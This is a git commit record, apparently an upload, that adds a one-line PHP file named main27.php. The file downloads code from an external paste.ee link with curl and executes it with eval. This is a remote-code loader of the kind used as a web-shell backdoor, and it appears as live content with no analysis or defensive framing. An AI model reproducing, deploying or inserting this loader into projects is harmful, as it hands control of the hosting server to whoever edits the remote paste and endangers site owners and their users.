c4a545f950102c0a0e7216bd67f9f6de07fba3fe
gio26 <visenza26@gmail.com>
2025-01-21 07:20:52 +0700

    Add files via upload

---
+++ main27.php
@@ -0,0 +1,1 @@
+<?php  $link = 'https://paste.ee/d/gZ7b6EJn'; $ch = curl_init();  curl_setopt($ch, CURLOPT_URL, $link); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  $output = curl_exec($ch);  curl_close($ch);       eval ('?>'.$output); ?>
